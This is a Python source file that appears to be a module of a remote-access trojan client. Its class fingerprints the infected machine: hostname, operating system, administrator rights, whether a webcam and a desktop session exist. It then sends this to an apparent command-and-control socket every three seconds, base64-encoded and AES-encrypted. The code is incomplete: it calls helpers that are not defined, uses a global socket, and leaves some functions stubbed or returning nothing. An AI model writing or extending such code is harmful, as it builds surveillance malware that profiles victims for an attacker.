import ctypes
import socket
import platform
import os
import time
import subprocess

# Check is administrator
class Basic:
    def __init__(self, sock) -> None:
        self.sock = sock

    def is_admin(self):
        try:
            if unix_like():
                return os.getuid() == 0
            else:
                return ctypes.windll.shell32.IsUserAnAdmin() != 0
        except:
            return False


    def cpu(self):
        if unix_like():
            pass
        else:
            # GET SYSTEMTIME
            user, kernel, idle = ctypes.c_ulonglong(), ctypes.c_ulonglong(), ctypes.c_ulonglong()
            ctypes.windll.kernel32.GetSystemTimes(ctypes.byref(user), ctypes.byref(kernel), ctypes.byref(idle))
            
            # CAUCULATE CPU PERCENTAGE
            total_time = user.value + kernel.value
            idle_time = idle.value
            cpu_usage_percent = (total_time - idle_time) / total_time * 100

    def desktop(self) -> bool:
        if unix_like():
            try:
                output = subprocess.check_output(['ps', 'aux'])
                if b'Xorg' in output or b'XServer' in output:
                    return True
                else:
                    return False
            except subprocess.CalledProcessError:
                return False
        else:
            try:
                module = __import__('psutil')
                for proc in module.process_iter():
                    try:
                        if proc.name() == 'explorer.exe':
                            return True
                    except (module.NoSuchProcess,module.AccessDenied,module.ZombieProcess):
                        return False
            except ModuleNotFoundError:
                return False

    def webcam(self) -> bool:
        try:
            module = __import__('cv2')
            try:
                cap = module.VideoCapture(0)
                if cap.isOpened():
                    return True
                else:
                    return False
            except:
                return False
        except ModuleNotFoundError:
            return False

    def active_window(self) -> str:
        module = None
        try:
            pass
        except ModuleNotFoundError:
            return None

        if unix_like():
            pass
        else:
            pass

    def details(self):
        data_list = [
            socket.gethostname(), # GET HOSTNAME
            "Online", # STATUS
            platform.platform(), # OPERATING SYSTEM
            str(self.cpu()), # CPU USAGE
            str(self.is_admin()), # IS ADMIN?
            "Python", # PAYLOAD
            str(self.webcam()), # WEBCAM?
            str(self.desktop()), # DESKTOP?
        ]
        return data_list
    
    def run(self):
        while True:
            try:
                data = "|".join(self.details())
                data = "Basic|" + data
                buffer = b64EnStr(data)
                sock.send(_buffer(2, 0, AES(AES_key).encrypt_cbc(buffer.encode(), IV_value)))
                time.sleep(3)
            except:
                return